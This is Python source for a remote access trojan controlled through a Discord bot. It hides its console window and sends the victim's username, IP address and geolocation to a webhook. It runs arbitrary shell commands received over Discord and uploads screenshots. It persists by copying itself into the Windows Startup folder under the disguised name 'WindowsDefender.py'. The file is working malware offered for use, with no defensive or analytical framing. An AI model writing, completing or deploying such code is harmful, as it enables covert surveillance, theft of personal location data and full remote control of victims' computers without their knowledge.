import os
import discord
import requests
import json
import asyncio
import datetime 
import pyautogui
import threading
import win32process
import asyncio
import ctypes


from discord.ext import commands
 
# global vars

username = os.getlogin()
startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
webhook = ""  # Replace with your webhook
bot     = commands.Bot(command_prefix=',', intents=discord.Intents.all())
token   = "" # replace wit yur bottoken

def broadcast(content):
    requests.post(webhook, json={'content': content})

def ip_info():
    r = requests.get("https://geolocation-db.com/json")

    if r.ok: # semd ip info to the server
        return r.text

ipv4 = json.loads(ip_info())['IPv4']


def HMA():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
HMA()
class Client:
    @staticmethod
    @bot.event
    async def on_ready():
        # get the IPv4 info
        ip_text = ip_info()
        # parse the JSON response
        ip_json = json.loads(ip_text)
        # create the broadcast string
        country = ip_json['country_code']
        state   = ip_json['state']
        city    = ip_json['city']
        postal  = ip_json['postal']
        ipv4      = ip_json['IPv4']
        lat     = ip_json['latitude']
        long    = ip_json['longitude']
        # broadcast string
        string = f"@\n{username}'s COUNTRY: {country}\n{username}'s STATE: {state}\n{username}'s CITY: {city}\n{username}'s IP: {ipv4}\n{username}'s POSTAL: {postal}\n{username}'s LAT: {lat}\n{username}'s LONG: {long}"
        # broadcast it 2 server
        broadcast(string)

class Commands:
 # - - - - - - - - - - - - - - - - - - - - - - - START OF SS COMMANDS - - - - - - - - - - - - - - - - - - - - - - - #
    class ScreenShotCommand:

        class TimeStampSki:

            def __init__(self):

                timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

                self.discordformat =   '`'


                self.timestampsforcode = {
                'year'   : timestamp[0:4],     # Extract 'year' (first 4 characters)
                'month'  : timestamp[5:7],     # Extract 'month' (characters 5-6)
                'day'    : timestamp[8:10],    # Extract 'day' (characters 8-9)
                'hour'   : timestamp[11:13],   # Extract 'hour' (characters 11-12)
                'minute' : timestamp[14:16],   # Extract 'minute' (characters 14-15)
                'second' : timestamp[17:19]    # Extract 'second' (characters 17-18)
                    }


                self.formatted_timestamp = (
                    f'{self.discordformat}{username}@{ipv4}{self.discordformat}\n'
                    f'\t{self.discordformat}{self.timestampsforcode['day']}/'
                    f'{self.timestampsforcode['month']}/'
                    f'{self.timestampsforcode['year']}{self.discordformat}'
                    f'\n \t \t {self.discordformat}{self.timestampsforcode['hour']}:'
                    f'{self.timestampsforcode['minute']}:'
                    f'{self.timestampsforcode["second"]}{self.discordformat}'
                    )
        
    

        class ScreenShot:

            def __init__(self):
                self.screenshot_path = "ss.png"

            def take_screenshot(self):
                ss = pyautogui.screenshot()
                ss.save(self.screenshot_path)

            async def send_ss(self, ctx):
                await ctx.reply(file=discord.File(self.screenshot_path))

                

    # - - - - - - - - - - - - - - - - - - - - - - - END OF SS COMMANDS - - - - - - - - - - - - - - - - - - - - - - - #

    class StartUpTools:
        def __init__(self):
            self.startup_folder = startup_path
            self.startup_file = os.path.join(self.startup_folder, "WindowsDefender.py")
            self.contents = None  # will hold file contents later

        async def opening_and_reading_file(self, ctx):
            try:
                with open(__file__, 'r', encoding='utf-8') as f:
                    self.contents = f.read()  # ✅ Save contents to instance
            except Exception as e:
                await ctx.reply(f'{e}, error reading/opening file to startup')
                return
            else:
                await ctx.reply('file has been open and read')

        async def initalizing_startup(self, ctx):
            try:
                os.makedirs(self.startup_folder, exist_ok=True)  # safer folder creation
            except Exception as e:
                await ctx.reply(f'could not add to start, Error: {e}')
                return

            try:
                if self.contents is None:
                    await ctx.reply("no file contents loaded.")
                    return  # This return must be inside the if!
                with open(self.startup_file, 'w', encoding='utf-8') as f:
                    f.write(self.contents)
                    await ctx.reply(f'{self.startup_file} has been written to startup')
            except Exception as e:
                await ctx.reply(f' failed to write to startup. Error: {e}')
                
    # - - - - - - - - - - - - - - - - - - - - - - - END OF STARTUP INITIAZTION - - - - - - - - - - - - - - - - - - - - - - - #

@bot.command()
async def shell(ctx):
    cmd = ctx.message.content[7:]  # Extract the shell command after '!shell'

    # Create a function to run the command in a separate thread and capture output
    def run_command():
        # Redirect the output of the shell command to a file
        os.system(f"{cmd} > output.txt 2>&1")  # Redirect stdout and stderr to a file

        # Read the output from the file
        with open("output.txt", "r") as file:
            output = file.read()

        # Check if the output is too large to send on Discord
        if len(output) > 2000:
            output = "output is too large to send"

        # Send the output back to Discord
        asyncio.run_coroutine_threadsafe(ctx.reply(output), bot.loop)

        # Optional: Clean up the temporary file after use
        os.remove("output.txt")

    # Run the command in a background thread to avoid blocking the bot
    threading.Thread(target=run_command).start()

    await ctx.reply("executing shell command in the background!")



@bot.command()
async def startup(ctx):
    tool = Commands.StartUpTools()
    await tool.opening_and_reading_file(ctx)
    await tool.initalizing_startup(ctx)

@bot.command()
async def s(ctx):
    timestamp_instance = Commands.ScreenShotCommand.TimeStampSki()
    screenshot_instance = Commands.ScreenShotCommand.ScreenShot()

    # Take screenshot before sending
    screenshot_instance.take_screenshot()

    # Reply with timestamp text
    await ctx.reply(f"The Time This Screen Shot Was Taken On is:\n{timestamp_instance.formatted_timestamp}")

    # Send the screenshot file
    await ctx.send(file=discord.File(screenshot_instance.screenshot_path))
    del_file = f"C:\\Users\\{username}\\Downloads\\"
    del_file1 = os.path.join(del_file, "ss.png")
    os.remove(del_file1)
    


if __name__ == "__main__":
    bot.run(token)